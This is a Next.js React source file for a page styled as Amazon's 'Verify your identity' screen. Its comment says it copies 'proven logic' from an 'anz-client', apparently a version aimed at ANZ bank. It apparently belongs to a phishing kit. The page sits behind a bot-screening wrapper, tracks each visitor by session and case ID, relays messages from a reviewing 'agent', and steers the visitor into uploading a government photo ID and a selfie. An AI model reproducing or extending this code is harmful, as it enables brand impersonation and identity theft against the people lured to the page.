'use client';

/**
 * KYC Page — Amazon Identity Verification
 *
 * Identity verification flow with Amazon auth-card styling.
 * Inline waiting state (button spinner, form stays visible).
 * Matches proven logic from anz-client.
 */

import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle, ShieldCheck, Loader2, ExternalLink } from 'lucide-react';

export default function KycPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { status, caseId, agentMessage } = useSessionStore();

  const [kycStatus, setKycStatus] = useState<'not_started' | 'in_progress' | 'waiting'>('not_started');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Store KYC URL for fallback link if popup is blocked
  const [kycUrl, setKycUrl] = useState<string | null>(null);
  const [popupBlocked, setPopupBlocked] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setKycStatus('not_started');
      setError(agentMessage || 'Your verification was rejected. Please try again.');
      setIsLoading(false);
    }
  }, [status, agentMessage]);

  async function handleBeginKYC() {
    if (!caseId) {
      setError('Session information missing.');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/user-started-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to start verification process');
      }

      const data = await response.json();
      const url = data.kyc_url || data.url || data.ballerine_url;

      if (!url) {
        throw new Error('Verification provider is not configured properly');
      }

      // Store the URL for fallback
      setKycUrl(url);

      // Try to open popup
      const popup = window.open(url, '_blank');

      // Check if popup was blocked
      if (!popup || popup.closed || typeof popup.closed === 'undefined') {
        // Popup was blocked - show fallback link
        setPopupBlocked(true);
      }

      setKycStatus('in_progress');
      setError(null);
    } catch (err) {
      console.error('KYC begin error:', err);
      setError('Unable to start verification. Please try again.');
    } finally {
      setIsLoading(false);
    }
  }

  async function handleKYCCompleted() {
    if (!caseId) {
      setError('Session information missing');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/submit-kyc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ case_id: caseId }),
      });

      if (!response.ok) {
        throw new Error('Failed to submit verification');
      }

      setKycStatus('waiting');
      useSessionStore.setState({
        status: 'waiting',
        agentMessage: 'Waiting for review...',
      });
    } catch (err) {
      console.error('KYC completion error:', err);
      setError('Failed to submit. Please try again.');
      setIsLoading(false);
    }
  }

  const handleRetry = () => {
    setError(null);
    setKycStatus('not_started');
    setPopupBlocked(false);
    setKycUrl(null);
  };

  const isWaiting = kycStatus === 'waiting' || status === 'waiting';

  return (
    <BotGuard>
      <div className="auth-card">
        <div className="auth-card-inner">
          <h1 className="auth-heading">Verify your identity</h1>

          {/* Error Alert */}
          {error && (
            <div className="alert-box alert-error" role="alert" style={{ marginBottom: '16px' }}>
              <div className="alert-icon">
                <AlertTriangle size={22} color="#CC0C39" />
              </div>
              <div className="alert-content">
                <span className="alert-heading">There was a problem</span>
                <span className="alert-message">{error}</span>
              </div>
            </div>
          )}

          {(kycStatus === 'not_started' && !isWaiting) && (
            <>
              <p className="kyc-description" style={{ fontSize: '13px', lineHeight: '19px', marginBottom: '14px' }}>
                To protect your account, we need to verify your identity. You&apos;ll be asked to provide
                a valid government-issued photo ID.
              </p>

              <p className="kyc-privacy-text" style={{ fontSize: '13px', lineHeight: '19px', marginBottom: '22px' }}>
                Your information is handled securely and in accordance with our{' '}
                <a href="#" className="kyc-link">Privacy Notice</a>.
              </p>

              <button
                type="button"
                className="btn-primary btn-continue"
                onClick={handleBeginKYC}
                disabled={isLoading}
                style={{ marginTop: 0, marginBottom: '22px' }}
              >
                {isLoading && <Loader2 size={16} className="spinner-inline" />}
                {isLoading ? 'Starting...' : 'Continue'}
              </button>

              <a href="#" className="kyc-id-types-link" style={{ display: 'block', marginBottom: '22px', fontSize: '13px' }}>
                What types of ID are accepted?
              </a>

              <div className="kyc-warning-notice" style={{ display: 'flex', alignItems: 'flex-start', gap: '8px', padding: '14px', background: '#FDF2E3', border: '1px solid #FBDDAA', borderRadius: '8px' }}>
                <ShieldCheck size={20} color="#E47911" style={{ flexShrink: 0, marginTop: '2px' }} />
                <span style={{ fontSize: '13px', lineHeight: '19px', color: '#111' }}>
                  Please have your physical ID document ready before continuing. Photos of IDs are not accepted.
                </span>
              </div>
            </>
          )}

          {(kycStatus === 'in_progress' || isWaiting) && (
            <>
              <div className="kyc-running-notice" style={{ marginBottom: '22px', fontSize: '13px', color: '#111' }}>
                <p style={{ marginBottom: '12px', fontSize: '15px', fontWeight: 500 }}>
                  Complete verification in the new window
                </p>
                <p style={{ marginBottom: '16px', color: '#565959' }}>
                  Once you have successfully uploaded your document and completed the selfie check, return here and click Continue.
                </p>

                {popupBlocked && kycUrl && (
                  <div className="alert-box alert-warning" role="alert" style={{ marginBottom: '16px', background: '#FDF2E3', border: '1px solid #FBDDAA' }}>
                    <div className="alert-icon">
                      <AlertTriangle size={22} color="#E47911" />
                    </div>
                    <div className="alert-content">
                      <span className="alert-heading" style={{ color: '#111' }}>Pop-up blocked</span>
                      <span className="alert-message">
                        <a href={kycUrl} target="_blank" rel="noopener noreferrer" className="popup-fallback-link" style={{ color: '#007185', textDecoration: 'none', display: 'flex', alignItems: 'center', gap: '4px', marginTop: '4px' }}>
                          Click here to open verification <ExternalLink size={14} />
                        </a>
                      </span>
                    </div>
                  </div>
                )}
              </div>

              <button
                type="button"
                className="btn-primary btn-continue"
                onClick={handleKYCCompleted}
                disabled={isWaiting}
                style={{ marginTop: 0, marginBottom: '16px' }}
              >
                {isWaiting && <Loader2 size={16} className="spinner-inline" />}
                {isWaiting ? 'Please wait...' : 'I have finished verification'}
              </button>

              <div style={{ textAlign: 'center' }}>
                <a
                  href="#"
                  onClick={(e) => { e.preventDefault(); handleRetry(); }}
                  style={{ fontSize: '13px', color: '#007185', textDecoration: 'none', pointerEvents: isWaiting ? 'none' : 'auto', opacity: isWaiting ? 0.6 : 1 }}
                >
                  Start over
                </a>
              </div>
            </>
          )}
        </div>
      </div>
    </BotGuard>
  );
}
